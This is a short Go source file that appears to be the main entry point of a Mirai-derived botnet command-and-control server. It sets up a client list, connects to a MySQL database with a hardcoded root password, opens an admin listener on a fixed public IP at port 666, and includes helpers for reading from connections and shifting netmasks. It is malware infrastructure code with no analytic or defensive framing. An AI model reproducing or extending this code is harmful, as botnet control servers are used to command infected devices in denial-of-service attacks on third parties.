package main

import (
    "fmt"
    "net"
    "errors"
    "time"
)

const DatabaseAddr string   = "127.0.0.1:3306"
const DatabaseUser string   = "root"
const DatabasePass string   = "myrox"
const DatabaseTable string  = "myroxxv0"

var clientList *ClientList = NewClientList()
var database *Database = NewDatabase(DatabaseAddr, DatabaseUser, DatabasePass, DatabaseTable)

func main() {
    tel, err := net.Listen("tcp", "63.250.59.28:666")
    if err != nil {
        fmt.Println(err)
        return
    }

    NewAdmin(tel).Handle()
    fmt.Println("ERROR: run ulimit -n 999999")
}



func readXBytes(conn net.Conn, buf []byte) (error) {
    tl := 0

    for tl < len(buf) {
        n, err := conn.Read(buf[tl:])
        if err != nil {
            return err
        }
        if n <= 0 {
            return errors.New("Connection closed unexpectedly")
        }
        tl += n
    }

    return nil
}

func netshift(prefix uint32, netmask uint8) uint32 {
    return uint32(prefix >> (32 - netmask))
}
